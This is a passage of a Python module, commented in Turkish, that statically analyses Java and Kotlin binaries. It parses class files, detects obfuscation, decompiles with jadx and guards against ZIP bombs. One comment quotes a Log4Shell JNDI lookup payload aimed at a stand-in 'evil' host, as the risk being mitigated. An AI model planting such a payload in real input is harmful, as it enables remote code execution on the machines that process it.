"""Java/Kotlin binary (JAR, APK, .class) analiz modulu.

JVM bytecode cok bilgi tasir — class isimleri, method isimleri,
field isimleri genellikle korunur. ProGuard/R8 obfuscation
uygulanmis olsa bile mapping.txt ile geri alinabilir.

Bytecode seviyesinde analiz:
- .class dosya formati: 0xCAFEBABE magic + constant pool parse
- .jar/.war/.ear: ZIP icinden class extraction ve toplu analiz
- Kotlin: kotlin.Metadata annotation, @JvmName/@JvmStatic detection

Araclar:
- jadx: APK/JAR -> Java kaynak kodu (en iyi decompiler)
- dex2jar + procyon/cfr: Alternatif
- jarsigner -verify: Imza dogrulama

Beklenen basari: %90+ (metadata cok zengin)
"""

from __future__ import annotations

import io
import json
import logging
import re
import shutil
import struct
import subprocess
import time
import zipfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Optional

from karadul.analyzers.base import BaseAnalyzer
from karadul.analyzers import register_analyzer
from karadul.config import Config
from karadul.core.result import StageResult
from karadul.core.safe_subprocess import resolve_tool, safe_env, safe_run
from karadul.core.target import TargetInfo, TargetType
from karadul.core.workspace import Workspace

logger = logging.getLogger(__name__)

# .class dosya sabitleri
_CLASS_MAGIC = b"\xCA\xFE\xBA\xBE"

# v1.10.0 Fix Sprint HIGH-2: ZIP bomb koruma sabitleri.
# Tek bir entry uncompressed bu boyutu asarsa okuma reddedilir.
_MAX_JAR_ENTRY_SIZE = 64 * 1024 * 1024  # 64MB (MANIFEST.MF / .class / AndroidManifest)
# Toplam decompress guvenlik ust siniri (okunan tum entry'lerin toplami).
_MAX_JAR_TOTAL_READ = 512 * 1024 * 1024  # 512MB

# v1.10.0 Batch 5B HIGH-6: .class dosyasi attribute_length DoS koruma.
# JVM spec u4 (4GB) izin veriyor ama gercekte <1MB; monkey-patch'lenebilir.
# SecurityConfig.max_jar_attr_len_bytes ile tutarli (config override icin
# JavaBinaryAnalyzer.__init__ self._max_attr_len kullanir; staticmethod
# parse fn modul sabitini kullanir).
_MAX_CLASS_ATTR_LEN = 10 * 1024 * 1024  # 10MB


def _safe_zip_read(zf: "zipfile.ZipFile", name: str, max_size: int = _MAX_JAR_ENTRY_SIZE) -> bytes:
    """ZipFile icinden entry oku, uncompressed_size onceden kontrol et.

    v1.10.0 Fix Sprint HIGH-2: zf.read(name) ZIP bomb'a acik. Bu wrapper
    getinfo().file_size ile uncompressed boyutu max_size ile karsilastirir
    ve asilirsa ValueError atar.
    """
    info = zf.getinfo(name)
    if info.file_size > max_size:
        raise ValueError(
            f"Guvenlik: ZIP entry {name!r} uncompressed {info.file_size} byte, "
            f"limit {max_size} (ZIP bomb olabilir)"
        )
    return zf.read(name)

# Constant pool tag degerleri (JVM Spec 4.4)
_CP_UTF8 = 1
_CP_INTEGER = 3
_CP_FLOAT = 4
_CP_LONG = 5
_CP_DOUBLE = 6
_CP_CLASS = 7
_CP_STRING = 8
_CP_FIELDREF = 9
_CP_METHODREF = 10
_CP_INTERFACE_METHODREF = 11
_CP_NAME_AND_TYPE = 12
_CP_METHOD_HANDLE = 15
_CP_METHOD_TYPE = 16
_CP_DYNAMIC = 17
_CP_INVOKE_DYNAMIC = 18
_CP_MODULE = 19
_CP_PACKAGE = 20

# Kotlin tespiti icin string pattern'leri
_KOTLIN_METADATA_ANNOTATION = "kotlin/Metadata"
_KOTLIN_PACKAGE_PREFIXES = ("kotlin.", "kotlinx.")
_KOTLIN_JVM_ANNOTATIONS = (
    "kotlin/jvm/JvmName",
    "kotlin/jvm/JvmStatic",
    "kotlin/jvm/JvmOverloads",
    "kotlin/jvm/JvmField",
    "kotlin/jvm/JvmDefault",
)

# Java major version -> JDK version mapping
def _detect_kotlin_from_strings(strings: list[str]) -> dict:
    """Constant pool string listesinden Kotlin tespiti yap.

    Returns:
        dict: detected (bool), evidence (list[str]), jvm_annotations (list[str])
    """
    result: dict[str, Any] = {
        "detected": False,
        "evidence": [],
        "jvm_annotations": [],
    }

    has_metadata = False
    jvm_anns: set[str] = set()
    kotlin_string_count = 0

    for s in strings:
        if _KOTLIN_METADATA_ANNOTATION in s:
            has_metadata = True
        for ann in _KOTLIN_JVM_ANNOTATIONS:
            if ann in s:
                jvm_anns.add(ann.rsplit("/", 1)[-1])
        if any(s.startswith(prefix) for prefix in _KOTLIN_PACKAGE_PREFIXES):
            kotlin_string_count += 1

    if has_metadata:
        result["detected"] = True
        result["evidence"].append("kotlin.Metadata annotation bulundu")
    if jvm_anns:
        result["detected"] = True
        result["jvm_annotations"] = sorted(jvm_anns)
        result["evidence"].append(f"JVM annotations: {', '.join(sorted(jvm_anns))}")
    if kotlin_string_count >= 3:
        result["detected"] = True
        result["evidence"].append(f"{kotlin_string_count} kotlin.* string pattern bulundu")

    return result


_JAVA_VERSION_MAP = {
    45: "JDK 1.1",
    46: "JDK 1.2",
    47: "JDK 1.3",
    48: "JDK 1.4",
    49: "Java 5",
    50: "Java 6",
    51: "Java 7",
    52: "Java 8",
    53: "Java 9",
    54: "Java 10",
    55: "Java 11",
    56: "Java 12",
    57: "Java 13",
    58: "Java 14",
    59: "Java 15",
    60: "Java 16",
    61: "Java 17",
    62: "Java 18",
    63: "Java 19",
    64: "Java 20",
    65: "Java 21",
    66: "Java 22",
    67: "Java 23",
    68: "Java 24",
}


@dataclass
class JavaAnalysisResult:
    """Java analiz sonucu."""
    classes: list[dict] = field(default_factory=list)
    packages: list[str] = field(default_factory=list)
    dependencies: list[str] = field(default_factory=list)
    manifest: dict = field(default_factory=dict)
    obfuscation_detected: bool = False
    mapping_file: Optional[Path] = None
    decompiled_dir: Optional[Path] = None
    total_methods: int = 0
    total_fields: int = 0
    source_files: int = 0


@register_analyzer(TargetType.JAVA_JAR)
@register_analyzer(TargetType.ANDROID_APK)
class JavaBinaryAnalyzer(BaseAnalyzer):
    """Java/Kotlin binary (JAR/APK) analiz motoru.

    JVM bytecode'dan tam kaynak kodu kurtarir. Obfuscation
    tespiti ve geri alma destegi.
    """

    supported_types = [TargetType.JAVA_JAR, TargetType.ANDROID_APK]

    def __init__(self, config: Config) -> None:
        super().__init__(config)
        # v1.10.0 Batch 5B CRITICAL-2: shutil.which -> resolve_tool ile
        # PATH hijack koruma. Sadece whitelist dizinlerden jadx kabul edilir.
        self._jadx_path = resolve_tool("jadx")
        # v1.10.0 Batch 5B MED-7: max .class attribute_length (DoS koruma)
        self._max_attr_len = config.security.max_jar_attr_len_bytes

    @staticmethod
    def can_handle(target_info: TargetInfo) -> bool:
        """JAR, APK veya .class dosyasi mi kontrol et."""
        path = target_info.path
        suffix = path.suffix.lower()

        # Uzanti kontrolu
        if suffix in (".jar", ".war", ".ear", ".apk", ".aab"):
            return True

        # .class dosyasi: 0xCAFEBABE magic bytes
        if suffix == ".class":
            try:
                with open(path, "rb") as f:
                    return f.read(4) == _CLASS_MAGIC
            except (OSError, PermissionError):
                pass
            return False

        # Magic bytes kontrolu
        try:
            with open(path, "rb") as f:
                magic = f.read(4)

            # Dogrudan .class magic (uzantisiz dosya)
            if magic == _CLASS_MAGIC:
                return True

            # ZIP formatindaki PK header -> JAR/WAR/EAR/APK olabilir
            if magic[:2] == b"PK":
                try:
                    with zipfile.ZipFile(path) as zf:
                        names = zf.namelist()
                        has_class = any(n.endswith(".class") for n in names)
                        has_dex = any(n.endswith(".dex") for n in names)
                        return has_class or has_dex
                except zipfile.BadZipFile:
                    pass
        except (OSError, PermissionError):
            pass

        return False

    def analyze_static(self, target: TargetInfo, workspace: Workspace) -> StageResult:
        """Java/Kotlin statik analiz.

        Analiz adimlari:
        1. JAR/APK icerik taramasi (class/resource sayimi)
        2. .class bytecode parse (constant pool, method/field extraction)
        3. Kotlin metadata tespiti
        4. MANIFEST.MF / AndroidManifest.xml okuma
        5. Obfuscation tespiti
        6. jadx ile decompile (varsa)
        7. Dependency analizi
        """
        start = time.monotonic()
        result_data: dict[str, Any] = {}
        errors: list[str] = []

        target_path = target.path
        is_single_class = (
            target_path.suffix.lower() == ".class"
            or self._is_class_file(target_path)
        )

        if is_single_class:
            # Tek .class dosyasi: dogrudan bytecode parse
            class_info = self._parse_class_file(target_path)
            result_data["class_info"] = class_info
            jar_info = {
                "class_count": 1,
                "resource_count": 0,
                "packages": [class_info["package"]] if class_info.get("package") else [],
                "main_class": class_info.get("this_class"),
                "kotlin_detected": class_info.get("kotlin_detected", False),
                "android_detected": False,
            }
            result_data["jar_info"] = jar_info
            result_data["kotlin_info"] = class_info.get("kotlin_info", {})
        else:
            # 1. ZIP/JAR icerigini incele
            jar_info = self._analyze_jar_contents(target_path)
            result_data["jar_info"] = jar_info

            # 2. .class dosyalarinin bytecode'unu parse et (constant pool)
            class_details = self._parse_classes_from_jar(target_path)
            result_data["class_details"] = class_details

            # 3. Kotlin metadata tespiti
            kotlin_info = self._detect_kotlin(target_path, jar_info, class_details)
            result_data["kotlin_info"] = kotlin_info
            if kotlin_info.get("detected"):
                jar_info["kotlin_detected"] = True

        # 4. Manifest dosyasini oku
        if not is_single_class:
            manifest = self._extract_manifest(target_path)
            result_data["manifest"] = manifest
        else:
            manifest = {}
            result_data["manifest"] = manifest

        # 5. Obfuscation tespiti
        obf_info = self._detect_obfuscation(target_path, jar_info)
        result_data["obfuscation"] = obf_info

        # 6. jadx ile decompile (sadece JAR/APK icin)
        if not is_single_class and self._jadx_path:
            decompile_dir = workspace.get_stage_dir("static") / "decompiled_java"
            decompiled = self._decompile_with_jadx(target_path, decompile_dir)
            result_data["decompiled"] = decompiled
            if decompiled.get("success"):
                result_data["source_files"] = decompiled.get("source_files", 0)
        elif not is_single_class:
            errors.append("jadx bulunamadi — 'brew install jadx' ile kurun")
            result_data["classes_from_strings"] = self._extract_classes_from_strings(target_path)

        # 7. Dependency analizi
        deps = self._analyze_dependencies(target_path, jar_info)
        result_data["dependencies"] = deps

        # Sonucu kaydet
        output_path = workspace.get_stage_dir("static") / "java_analysis.json"
        output_path.parent.mkdir(parents=True, exist_ok=True)
        output_path.write_text(json.dumps(result_data, indent=2, default=str))

        artifacts = {"java_analysis": str(output_path)}
        stats = {
            "total_classes": jar_info.get("class_count", 0),
            "total_packages": len(jar_info.get("packages", [])),
            "obfuscated": obf_info.get("detected", False),
            "decompiled": bool(result_data.get("decompiled", {}).get("success")),
            "kotlin_detected": jar_info.get("kotlin_detected", False),
        }

        duration = time.monotonic() - start
        return StageResult(
            stage_name="static",
            success=True,
            duration_seconds=duration,
            artifacts=artifacts,
            stats=stats,
            errors=errors,
        )

    def deobfuscate(self, target: TargetInfo, workspace: Workspace) -> StageResult:
        """ProGuard/R8 obfuscation geri alma."""
        start = time.monotonic()
        errors: list[str] = []
        artifacts: dict[str, str] = {}

        # Onceki asamadan analiz sonucunu oku
        analysis_path = workspace.get_stage_dir("static") / "java_analysis.json"
        if not analysis_path.exists():
            return StageResult(
                stage_name="deobfuscate", success=True,
                duration_seconds=time.monotonic() - start,
                artifacts={}, stats={}, errors=[],
            )

        analysis = json.loads(analysis_path.read_text())
        obf = analysis.get("obfuscation", {})

        if not obf.get("detected"):
            logger.info("Java obfuscation tespit edilmedi, deobfuscation atlaniyor")
            return StageResult(
                stage_name="deobfuscate", success=True,
                duration_seconds=time.monotonic() - start,
                artifacts={}, stats={"obfuscated": False}, errors=[],
            )

        # mapping.txt varsa ProGuard mapping uygula
        mapping_file = obf.get("mapping_file")
        if mapping_file and Path(mapping_file).exists():
            mapping = self._parse_proguard_mapping(Path(mapping_file))
            artifacts["proguard_mapping"] = str(mapping_file)
            logger.info("ProGuard mapping yuklendi: %d sinif eslesmesi", len(mapping))
        else:
            logger.info("ProGuard mapping dosyasi bulunamadi")

        return StageResult(
            stage_name="deobfuscate", success=True,
            duration_seconds=time.monotonic() - start,
            artifacts=artifacts, stats={"obfuscated": True}, errors=errors,
        )

    def reconstruct(self, target: TargetInfo, workspace: Workspace) -> StageResult | None:
        """Java proje yapisi olustur."""
        start = time.monotonic()
        output_dir = workspace.get_stage_dir("reconstructed") / "java_project"
        output_dir.mkdir(parents=True, exist_ok=True)

        analysis_path = workspace.get_stage_dir("static") / "java_analysis.json"
        if not analysis_path.exists():
            return None

        analysis = json.loads(analysis_path.read_text())
        manifest = analysis.get("manifest", {})
        deps = analysis.get("dependencies", [])

        # build.gradle olustur
        build_gradle = self._generate_build_gradle(manifest, deps)
        (output_dir / "build.gradle").write_text(build_gradle)

        # Decompiled kaynaklari kopyala
        decompiled = analysis.get("decompiled", {})
        if decompiled.get("success") and decompiled.get("output_dir"):
            src_dir = Path(decompiled["output_dir"])
            if src_dir.exists():
                dst = output_dir / "src" / "main" / "java"
                shutil.copytree(src_dir, dst, dirs_exist_ok=True)

        return StageResult(
            stage_name="reconstruct", success=True,
            duration_seconds=time.monotonic() - start,
            artifacts={"java_project": str(output_dir)},
            stats={"reconstructed": True}, errors=[],
        )

    # ------------------------------------------------------------------
    # Private helpers
    # ------------------------------------------------------------------

    def _analyze_jar_contents(self, path: Path) -> dict:
        """JAR/APK icindeki dosyalari analiz et."""
        result = {
            "class_count": 0,
            "resource_count": 0,
            "packages": [],
            "main_class": None,
            "kotlin_detected": False,
            "android_detected": False,
        }

        try:
            with zipfile.ZipFile(path) as zf:
                names = zf.namelist()
                packages = set()

                for name in names:
                    if name.endswith(".class"):
                        result["class_count"] += 1
                        # Package cikart
                        if "/" in name:
                            pkg = name.rsplit("/", 1)[0].replace("/", ".")
                            packages.add(pkg)
                    elif name.endswith(".dex"):
                        result["android_detected"] = True
                    elif name == "kotlin/kotlin.kotlin_builtins":
                        result["kotlin_detected"] = True
                    elif name.startswith("kotlin/"):
                        result["kotlin_detected"] = True
                    else:
                        result["resource_count"] += 1

                result["packages"] = sorted(packages)
        except (zipfile.BadZipFile, OSError) as e:
            logger.warning("JAR icerik analizi basarisiz: %s", e)

        return result

    def _extract_manifest(self, path: Path) -> dict:
        """MANIFEST.MF veya AndroidManifest.xml oku."""
        manifest = {}

        try:
            with zipfile.ZipFile(path) as zf:
                # Java JAR: META-INF/MANIFEST.MF
                if "META-INF/MANIFEST.MF" in zf.namelist():
                    # v1.10.0 Fix Sprint HIGH-2: ZIP bomb koruma
                    content = _safe_zip_read(zf, "META-INF/MANIFEST.MF").decode("utf-8", errors="replace")
                    for line in content.split("\n"):
                        if ":" in line:
                            key, _, value = line.partition(":")
                            manifest[key.strip()] = value.strip()

                # Android: AndroidManifest.xml (binary XML, strings ile parse)
                if "AndroidManifest.xml" in zf.namelist():
                    manifest["is_android"] = True
                    # Binary XML'den package name cikarma
                    try:
                        data = _safe_zip_read(zf, "AndroidManifest.xml")
                        # UTF-16 string'leri ara
                        strings = re.findall(rb"[\x20-\x7e]{4,}", data)
                        for s in strings:
                            decoded = s.decode("ascii", errors="ignore")
                            if "." in decoded and decoded.count(".") >= 2:
                                if not decoded.startswith("http"):
                                    manifest.setdefault("package", decoded)
                                    break
                    except Exception:
                        logger.debug("Java class analizi basarisiz, atlaniyor", exc_info=True)
        except (zipfile.BadZipFile, OSError):
            pass

        return manifest

    def _detect_obfuscation(self, path: Path, jar_info: dict) -> dict:
        """ProGuard/R8 obfuscation tespiti."""
        result = {
            "detected": False,
            "type": None,
            "evidence": [],
            "mapping_file": None,
        }

        packages = jar_info.get("packages", [])

        # Tek harfli paket isimleri = obfuscated
        single_letter_pkgs = [p for p in packages if re.match(r"^[a-z](\.[a-z])*$", p)]
        if len(single_letter_pkgs) > len(packages) * 0.3 and len(packages) > 5:
            result["detected"] = True
            result["type"] = "proguard_r8"
            result["evidence"].append(
                f"{len(single_letter_pkgs)}/{len(packages)} paket tek harfli"
            )

        # mapping.txt kontrolu (ayni dizinde)
        mapping_candidates = [
            path.parent / "mapping.txt",
            path.parent / "proguard" / "mapping.txt",
            path.parent / "build" / "outputs" / "mapping" / "release" / "mapping.txt",
        ]
        for mp in mapping_candidates:
            if mp.exists():
                result["mapping_file"] = str(mp)
                result["evidence"].append(f"mapping.txt bulundu: {mp}")
                break

        return result

    def _decompile_with_jadx(self, path: Path, output_dir: Path) -> dict:
        """jadx ile JAR/APK decompile."""
        result = {"success": False, "output_dir": str(output_dir), "source_files": 0}

        try:
            output_dir.mkdir(parents=True, exist_ok=True)
            cmd = [
                self._jadx_path,
                "--no-debug-info",
                "--no-replace-consts",
                "--output-dir", str(output_dir),
                str(path),
            ]
            # v1.10.0 Batch 5B CRITICAL-1: Log4Shell (CVE-2021-44228) koruma.
            # jadx kendisi Log4j2 <= 2.14 kullanabilir ve malicious APK icindeki
            # ${jndi:ldap://evil/a} string'i cozumlenirse RCE olur.
            # JAVA_TOOL_OPTIONS ile lookup'lar global olarak kapatilir.
            proc = safe_run(
                cmd,
                capture_output=True,
                text=True,
                timeout=self.config.timeouts.subprocess,
            )

            if proc.returncode == 0 or output_dir.exists():
                # Decompile edilen .java dosyalarini say
                java_files = list(output_dir.rglob("*.java"))
                result["success"] = True
                result["source_files"] = len(java_files)
                logger.info("jadx decompile basarili: %d .java dosyasi", len(java_files))
            else:
                result["error"] = proc.stderr[:500] if proc.stderr else "Unknown error"
                logger.warning("jadx basarisiz: %s", result["error"])
        except subprocess.TimeoutExpired:
            result["error"] = "jadx timeout"
        except Exception as e:
            result["error"] = str(e)

        return result

    def _extract_classes_from_strings(self, path: Path) -> list[str]:
        """jadx yoksa strings ile class isimlerini cikar."""
        try:
            # v1.10.0 Batch 5B CRITICAL-2: resolve_tool + safe_env
            strings_bin = resolve_tool("strings") or "strings"
            proc = safe_run(
                [strings_bin, str(path)],
                capture_output=True, text=True, timeout=60,
            )
            if proc.returncode == 0:
                # Java class name pattern: com.example.ClassName
                classes = set()
                for line in proc.stdout.split("\n"):
                    # Full qualified class name
                    match = re.search(
                        r"((?:[a-z][a-z0-9_]*\.){2,}[A-Z][a-zA-Z0-9_$]*)", line
                    )
                    if match:
                        classes.add(match.group(1))
                return sorted(classes)[:1000]  # Max 1000
        except Exception:
            logger.debug("Java class analizi basarisiz, atlaniyor", exc_info=True)
        return []

    def _analyze_dependencies(self, path: Path, jar_info: dict) -> list[str]:
        """Kullanilan kutuphaneleri tespit et."""
        deps = []
        packages = jar_info.get("packages", [])

        # Bilinen kutuphane pattern'leri
        known_libs = {
            "com.google.gson": "gson",
            "com.google.protobuf": "protobuf-java",
            "org.apache.http": "httpclient",
            "org.json": "json",
            "com.squareup.okhttp": "okhttp",
            "com.squareup.retrofit": "retrofit",
            "io.reactivex": "rxjava",
            "kotlinx.coroutines": "kotlinx-coroutines",
            "androidx": "androidx",
            "android.support": "support-library",
            "org.slf4j": "slf4j",
            "ch.qos.logback": "logback",
            "com.fasterxml.jackson": "jackson",
            "org.apache.commons": "commons",
            "junit": "junit",
            "org.mockito": "mockito",
        }

        for pkg in packages:
            for prefix, lib_name in known_libs.items():
                if pkg.startswith(prefix):
                    if lib_name not in deps:
                        deps.append(lib_name)
                    break

        return deps

    def _parse_proguard_mapping(self, mapping_path: Path) -> dict[str, str]:
        """ProGuard mapping.txt'yi parse et: obfuscated -> original."""
        mapping = {}
        try:
            content = mapping_path.read_text(encoding="utf-8", errors="replace")
            for line in content.split("\n"):
                line = line.strip()
                if line and "->" in line and not line.startswith("#"):
                    parts = line.split("->")
                    if len(parts) == 2:
                        original = parts[0].strip().rstrip(":")
                        obfuscated = parts[1].strip().rstrip(":")
                        mapping[obfuscated] = original
        except Exception as e:
            logger.warning("ProGuard mapping parse hatasi: %s", e)
        return mapping

    # ------------------------------------------------------------------
    # .class bytecode parsing
    # ------------------------------------------------------------------

    @staticmethod
    def _is_class_file(path: Path) -> bool:
        """Dosyanin .class formati olup olmadigini magic bytes ile kontrol et."""
        try:
            with open(path, "rb") as f:
                return f.read(4) == _CLASS_MAGIC
        except (OSError, PermissionError):
            return False

    @staticmethod
    def _parse_class_file(path_or_data: Path | bytes) -> dict:
        """Tek bir .class dosyasini parse et: constant pool, class/method/field isimleri.

        JVM class file formati (JVMS 4.1):
          magic (u4) | minor_version (u2) | major_version (u2)
          constant_pool_count (u2) | constant_pool[...]
          access_flags (u2) | this_class (u2) | super_class (u2)
          interfaces_count (u2) | interfaces[...]
          fields_count (u2) | fields[...]
          methods_count (u2) | methods[...]
          attributes_count (u2) | attributes[...]

        Returns:
            dict: this_class, super_class, package, methods, fields,
                  java_version, kotlin_detected, kotlin_info, strings
        """
        result: dict[str, Any] = {
            "this_class": None,
            "super_class": None,
            "package": None,
            "interfaces": [],
            "methods": [],
            "fields": [],
            "java_version": None,
            "java_version_label": None,
            "kotlin_detected": False,
            "kotlin_info": {},
            "strings": [],
        }

        try:
            if isinstance(path_or_data, (bytes, bytearray)):
                data = path_or_data
            else:
                data = path_or_data.read_bytes()

            if len(data) < 10 or data[:4] != _CLASS_MAGIC:
                return result

            r = io.BytesIO(data)
            r.read(4)  # magic

            minor = struct.unpack(">H", r.read(2))[0]
            major = struct.unpack(">H", r.read(2))[0]
            result["java_version"] = major
            result["java_version_label"] = _JAVA_VERSION_MAP.get(major, f"unknown ({major})")

            # --- Constant pool parse ---
            cp_count = struct.unpack(">H", r.read(2))[0]
            # Index 0 kullanilmaz, constant pool 1..cp_count-1
            cp = [None] * cp_count  # type: ignore[assignment]
            i = 1
            while i < cp_count:
                tag = struct.unpack("B", r.read(1))[0]
                if tag == _CP_UTF8:
                    length = struct.unpack(">H", r.read(2))[0]
                    raw = r.read(length)
                    try:
                        cp[i] = ("utf8", raw.decode("utf-8", errors="replace"))
                    except Exception:
                        logger.debug("Java constant pool UTF-8 decode basarisiz, atlaniyor", exc_info=True)
                        cp[i] = ("utf8", "")
                elif tag == _CP_INTEGER:
                    r.read(4)
                    cp[i] = ("integer", None)
                elif tag == _CP_FLOAT:
                    r.read(4)
                    cp[i] = ("float", None)
                elif tag == _CP_LONG:
                    r.read(8)
                    cp[i] = ("long", None)
                    i += 1  # long/double 2 slot kaplayir
                elif tag == _CP_DOUBLE:
                    r.read(8)
                    cp[i] = ("double", None)
                    i += 1
                elif tag == _CP_CLASS:
                    name_idx = struct.unpack(">H", r.read(2))[0]
                    cp[i] = ("class", name_idx)
                elif tag == _CP_STRING:
                    str_idx = struct.unpack(">H", r.read(2))[0]
                    cp[i] = ("string", str_idx)
                elif tag in (_CP_FIELDREF, _CP_METHODREF, _CP_INTERFACE_METHODREF):
                    r.read(4)  # class_idx (2) + name_and_type_idx (2)
                    cp[i] = ("ref", None)
                elif tag == _CP_NAME_AND_TYPE:
                    r.read(4)  # name_idx (2) + descriptor_idx (2)
                    cp[i] = ("nat", None)
                elif tag == _CP_METHOD_HANDLE:
                    r.read(3)
                    cp[i] = ("mh", None)
                elif tag == _CP_METHOD_TYPE:
                    r.read(2)
                    cp[i] = ("mt", None)
                elif tag in (_CP_DYNAMIC, _CP_INVOKE_DYNAMIC):
                    r.read(4)
                    cp[i] = ("dyn", None)
                elif tag == _CP_MODULE:
                    r.read(2)
                    cp[i] = ("module", None)
                elif tag == _CP_PACKAGE:
                    r.read(2)
                    cp[i] = ("package", None)
                else:
                    # Bilinmeyen tag -- dosya bozuk veya yeni JVM spec
                    break
                i += 1

            def resolve_utf8(idx: int) -> str:
                """Constant pool index'inden UTF-8 string coz."""
                if 0 < idx < cp_count and cp[idx] is not None:
                    if cp[idx][0] == "utf8":
                        return cp[idx][1]
                    elif cp[idx][0] == "class":
                        return resolve_utf8(cp[idx][1])
                return ""

            # UTF8 string'leri topla
            all_strings = []
            for entry in cp:
                if entry is not None and entry[0] == "utf8":
                    all_strings.append(entry[1])
            result["strings"] = all_strings[:2000]  # max 2000

            # access_flags, this_class, super_class
            access_flags = struct.unpack(">H", r.read(2))[0]
            this_class_idx = struct.unpack(">H", r.read(2))[0]
            super_class_idx = struct.unpack(">H", r.read(2))[0]

            this_class = resolve_utf8(this_class_idx).replace("/", ".")
            super_class = resolve_utf8(super_class_idx).replace("/", ".")
            result["this_class"] = this_class
            result["super_class"] = super_class

            # Package cikar
            if "." in this_class:
                result["package"] = this_class.rsplit(".", 1)[0]

            # Interfaces
            iface_count = struct.unpack(">H", r.read(2))[0]
            for _ in range(iface_count):
                iface_idx = struct.unpack(">H", r.read(2))[0]
                iface_name = resolve_utf8(iface_idx).replace("/", ".")
                if iface_name:
                    result["interfaces"].append(iface_name)

            # v1.10.0 Batch 5B HIGH-6: attr_len DoS koruma.
            # JVM .class spec'i u4 (max 4GB) izin veriyor ama normal .class
            # dosyasinda attribute genellikle <1MB. Malicious .class 4GB
            # istese memory explode olur -- `MAX_ATTR_LEN` ile kapat.
            # staticmethod oldugu icin modul-seviyesi sabit kullaniyoruz; test/
            # caller istege bagli `_MAX_CLASS_ATTR_LEN`'i monkey-patch edebilir.
            max_attr_len = _MAX_CLASS_ATTR_LEN

            # Fields
            fields_count = struct.unpack(">H", r.read(2))[0]
            for _ in range(fields_count):
                f_access = struct.unpack(">H", r.read(2))[0]
                f_name_idx = struct.unpack(">H", r.read(2))[0]
                f_desc_idx = struct.unpack(">H", r.read(2))[0]
                f_attr_count = struct.unpack(">H", r.read(2))[0]
                for _ in range(f_attr_count):
                    r.read(2)  # attr name idx
                    attr_len = struct.unpack(">I", r.read(4))[0]
                    if attr_len > max_attr_len:
                        logger.warning(
                            ".class field attr_len %d > max %d -- malicious class?",
                            attr_len, max_attr_len,
                        )
                        raise struct.error("attr_len DoS rejected")
                    r.read(attr_len)
                field_name = resolve_utf8(f_name_idx)
                field_desc = resolve_utf8(f_desc_idx)
                if field_name:
                    result["fields"].append({
                        "name": field_name,
                        "descriptor": field_desc,
                    })

            # Methods
            methods_count = struct.unpack(">H", r.read(2))[0]
            for _ in range(methods_count):
                m_access = struct.unpack(">H", r.read(2))[0]
                m_name_idx = struct.unpack(">H", r.read(2))[0]
                m_desc_idx = struct.unpack(">H", r.read(2))[0]
                m_attr_count = struct.unpack(">H", r.read(2))[0]
                for _ in range(m_attr_count):
                    r.read(2)
                    attr_len = struct.unpack(">I", r.read(4))[0]
                    if attr_len > max_attr_len:
                        logger.warning(
                            ".class method attr_len %d > max %d -- malicious class?",
                            attr_len, max_attr_len,
                        )
                        raise struct.error("attr_len DoS rejected")
                    r.read(attr_len)
                method_name = resolve_utf8(m_name_idx)
                method_desc = resolve_utf8(m_desc_idx)
                if method_name:
                    result["methods"].append({
                        "name": method_name,
                        "descriptor": method_desc,
                    })

            # Kotlin tespiti: constant pool'da kotlin marker'lari ara
            kotlin_info = _detect_kotlin_from_strings(all_strings)
            result["kotlin_detected"] = kotlin_info["detected"]
            result["kotlin_info"] = kotlin_info

        except (struct.error, OSError, IndexError, ValueError) as e:
            logger.debug("Class file parse hatasi: %s", e)

        return result

    def _parse_classes_from_jar(self, jar_path: Path, max_classes: int = 200) -> list[dict]:
        """JAR/WAR/EAR icindeki .class dosyalarini parse et.

        Performans icin en fazla max_classes adet class parse edilir.
        """
        results = []
        try:
            with zipfile.ZipFile(jar_path) as zf:
                class_entries = [
                    n for n in zf.namelist()
                    if n.endswith(".class") and not n.startswith("META-INF/")
                ]
                # Cok fazla class varsa ornekle
                if len(class_entries) > max_classes:
                    import random
                    class_entries = random.sample(class_entries, max_classes)

                # v1.10.0 Fix Sprint HIGH-2: ZIP bomb -- toplam decompress
                # bytes takip et, _MAX_JAR_TOTAL_READ asilirsa kalan class'lari
                # atlarken uyari logla (saldirgan her entry'i _MAX_JAR_ENTRY_SIZE
                # tutsa bile 200 x 64MB = 12.8GB cikabilir).
                total_read = 0
                for entry_name in class_entries:
                    if total_read > _MAX_JAR_TOTAL_READ:
                        logger.warning(
                            "JAR toplam decompress limiti asildi (%d byte), "
                            "kalan class'lar atlaniyor", _MAX_JAR_TOTAL_READ,
                        )
                        break
                    try:
                        data = _safe_zip_read(zf, entry_name)
                        total_read += len(data)
                        if data[:4] == _CLASS_MAGIC:
                            info = self._parse_class_file(data)
                            info["source_entry"] = entry_name
                            results.append(info)
                    except ValueError as exc:
                        logger.warning("Java class atlandi (ZIP bomb koruma): %s -- %s", entry_name, exc)
                        continue
                    except Exception:
                        logger.debug("Java class analizi basarisiz, atlaniyor", exc_info=True)
                        continue
        except (zipfile.BadZipFile, OSError) as e:
            logger.warning("JAR class parse hatasi: %s", e)

        return results

    # ------------------------------------------------------------------
    # Kotlin detection
    # ------------------------------------------------------------------

    def _detect_kotlin(self, path: Path, jar_info: dict,
                       class_details: list[dict]) -> dict:
        """Kotlin tespiti: JAR iceriginden ve class bytecode'dan.

        Kontroller:
        1. kotlin/ dizini veya kotlin.kotlin_builtins (jar_info'dan)
        2. Constant pool'da kotlin.Metadata annotation
        3. @JvmName, @JvmStatic, @JvmOverloads annotation'lari
        4. "kotlin." / "kotlinx." string pattern'leri
        """
        result: dict[str, Any] = {
            "detected": jar_info.get("kotlin_detected", False),
            "evidence": [],
            "jvm_annotations": [],
            "kotlin_version": None,
        }

        if jar_info.get("kotlin_detected"):
            result["evidence"].append("kotlin/ dizini veya kotlin_builtins JAR icinde bulundu")

        # Class bytecode'lardan Kotlin isaretleri
        metadata_count = 0
        jvm_annotations: set[str] = set()

        for cls in class_details:
            strings = cls.get("strings", [])
            for s in strings:
                if _KOTLIN_METADATA_ANNOTATION in s:
                    metadata_count += 1
                for ann in _KOTLIN_JVM_ANNOTATIONS:
                    if ann in s:
                        jvm_annotations.add(ann.rsplit("/", 1)[-1])

        if metadata_count > 0:
            result["detected"] = True
            result["evidence"].append(
                f"kotlin.Metadata annotation {metadata_count} class'ta bulundu"
            )

        if jvm_annotations:
            result["detected"] = True
            result["jvm_annotations"] = sorted(jvm_annotations)
            result["evidence"].append(
                f"Kotlin JVM annotation'lari: {', '.join(sorted(jvm_annotations))}"
            )

        # ZIP icinde META-INF/kotlin-stdlib.kotlin_module varsa version cikar
        try:
            if not isinstance(path, bytes) and path.exists():
                with zipfile.ZipFile(path) as zf:
                    for name in zf.namelist():
